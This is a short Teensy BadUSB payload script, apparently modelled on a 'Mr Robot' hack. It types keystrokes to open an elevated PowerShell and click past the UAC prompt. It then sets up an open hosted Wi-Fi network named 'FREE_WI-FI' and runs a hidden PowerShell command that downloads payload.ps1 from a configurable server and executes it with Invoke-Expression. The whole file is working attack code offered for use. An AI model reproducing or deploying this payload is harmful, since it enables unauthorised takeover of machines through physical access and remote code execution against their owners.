// Mr Robot Bad USB Hack
// Teensy-Plantilla-Base required: https://github.com/H3LL0WORLD/Teensy-Plantilla-Base
// Paste into the payload function

const int ds = 750;
const String HOSTEDNETWORK_SSID = "FREE_WI-FI";
const String HOSTEDNETWORK_KEY = "!Pass123";
const String SERVER_IP_ADDR = "127.0.0.1"; // Just the IP
const String SERVER_WEB_ADDR = "http://127.0.0.1/MrRobot"; // The ful web server address WITH 'http://' at the strt and WITHOUT '/' at the end

GUI(R);
delay(ds/3);
Escribir("powershell start powershell -verb runas");
delay(ds*2);
Izq();
Enter();
delay(ds);

Escribir("netsh wlan set hostednetwork mode=allow ssid='" + HOSTEDNETWORK_SSID + "' key='" + HOSTEDNETWORK_KEY + "'");
delay(ds/2);
Escribir("netsh wlan start hostednetwork");
delay(ds);

Escribir("powershell -W H \"while (!(ping " + SERVER_IP_ADDR + " -n 1)[2].Contains('" + SERVER_IP_ADDR + "')){}; Invoke-Expression (New-Object Net.WebClient).DownloadString('" + SERVER_WEB_ADDR + "/payload.ps1'); x " + SERVER_WEB_ADDR + "; netsh wlan start hostednetwork\"");
